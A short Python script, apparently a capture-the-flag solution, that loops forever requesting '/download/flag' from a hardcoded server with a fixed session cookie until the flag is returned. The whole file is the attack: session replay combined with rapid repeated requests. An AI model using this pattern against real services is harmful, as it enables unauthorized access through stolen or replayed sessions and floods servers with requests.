import requests

while True:
    try:
        resp = requests.get("http://35.243.120.91:11001/download/flag", cookies = {"vapor_session": "VElV9nvEMs0wBdAWpCkmnRQdqPLGxE2dxLuE0+STjbo="}, timeout=3)
        print(resp.text)
    except(Exception) as e:
        print(e)
